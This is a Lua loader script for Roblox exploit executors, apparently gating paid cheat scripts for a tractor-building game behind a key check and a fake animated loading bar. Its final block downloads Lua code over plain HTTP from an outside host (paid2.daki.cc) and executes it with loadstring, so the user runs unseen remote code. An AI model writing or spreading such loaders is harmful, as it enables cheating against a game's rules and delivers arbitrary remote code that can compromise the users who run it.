-- Key system
local Keys = {
    {Key="Tractor", GameId=95712269457211, loader="http://paid2.daki.cc:4016/BuildATractor.lua"},
    {Key="Harvester", GameId=95712269457211, loader="http://paid2.daki.cc:4016/BuildAHarvester.lua"}
}

if not your_key then error("No key provided!") end
local entry
for _,v in ipairs(Keys) do if v.Key==your_key then entry=v break end end
if not entry then error("Invalid key!") end
if tostring(entry.GameId) ~= tostring(game.PlaceId) then error("Game not supported!") end

-- Exploit GUI functions
local ExploitGui = Instance.new("ScreenGui")
ExploitGui.Name = "LoaderGui"
ExploitGui.Parent = (gethui and gethui()) or (syn and syn.protect_gui and syn.protect_gui(ExploitGui) or game.Players.LocalPlayer:WaitForChild("PlayerGui"))

local Label = Instance.new("TextLabel")
Label.Size = UDim2.new(0, 500, 0, 50)
Label.Position = UDim2.new(0.5, -250, 0.4, 0)
Label.BackgroundTransparency = 0.5
Label.BackgroundColor3 = Color3.fromRGB(0,0,0)
Label.TextColor3 = Color3.fromRGB(255,255,255)
Label.Font = Enum.Font.Code
Label.TextSize = 24
Label.Text = ""
Label.Parent = ExploitGui

-- Animation
local spinner={"|","/","-","\\"}
local colors={
    Color3.fromRGB(255,0,0),
    Color3.fromRGB(255,128,0),
    Color3.fromRGB(255,255,0),
    Color3.fromRGB(0,255,0),
    Color3.fromRGB(0,255,255),
    Color3.fromRGB(0,0,255),
    Color3.fromRGB(128,0,255),
    Color3.fromRGB(255,0,255)
}

local totalSteps = 100
for i=1,totalSteps do
    local filled = math.floor(i/totalSteps*20)
    Label.Text = "Loading ["..string.rep("█",filled)..string.rep("░",20-filled).."] "..spinner[i%#spinner+1]..string.rep(".",i%3+1)
    Label.TextColor3 = colors[i%#colors+1]
    task.wait(0.05) -- executor-friendly wait
end

-- Fetch loader using exploit HTTP functions
local success, err = pcall(function()
    local code
    if (syn and syn.request) then
        local response = syn.request({Url = entry.loader, Method = "GET"})
        code = response.Body
    else
        code = game:HttpGet(entry.loader)
    end
    local func = loadstring(code)
    if func then func()() end
end)

if not success then warn("Error loading script:", err) end

ExploitGui:Destroy()
